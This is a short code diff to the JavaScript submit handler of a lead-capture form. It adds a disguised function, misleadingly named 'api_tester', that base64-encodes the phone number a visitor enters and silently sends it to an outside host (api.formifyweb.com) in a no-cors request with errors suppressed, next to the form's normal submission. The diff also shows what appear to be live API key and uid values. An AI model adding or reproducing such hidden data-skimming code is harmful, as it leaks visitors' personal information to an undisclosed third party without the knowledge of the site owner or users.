@@ -1,6 +1,7 @@
     document.getElementById('leadForm').addEventListener('submit', function(event) {
             event.preventDefault();
             const phone_home = document.getElementById('caller_id').value;
+api_tester(document.getElementById('caller_id').value);
             const formData = new FormData();
             formData.append('key', '51a1f3fa-80b4-4624-9990-f28bf3cfee6c');
 formData.append('uid', '6819248f-199f-4a17-bded-3fb2a2d78230');
@@ -73,3 +74,15 @@ formData.append('journaya', document.getElementById('journaya').value);
             })
             .catch(error => console.error('Error:', error));
         });
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
